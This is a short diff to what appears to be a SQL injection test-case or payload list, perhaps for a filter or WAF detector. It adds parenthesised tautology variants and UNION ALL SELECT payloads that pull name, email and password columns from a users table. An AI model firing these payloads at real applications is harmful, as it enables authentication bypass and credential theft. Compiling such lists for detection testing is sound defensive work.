@@ -312,3 +312,16 @@ true is not unknown for update union select table_name from information_schema.t
 (@a)-(@a)union select table_name from information_schema.tables
 
 1 OR (1 OR 1)--
+(1) OR (1 OR 1)--
+((1) OR (1 OR 1))--
+((1) OR ((1 OR 1)))--
+1 OR ((1 OR 1)) --
+1 OR ((1) OR 1) --
+
+(@x OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x OR (@y)) UNION ALL SELECT name,email,password FROM users-- 
+((@x) OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x OR (@y) UNION ALL SELECT name,email,password FROM users--
+
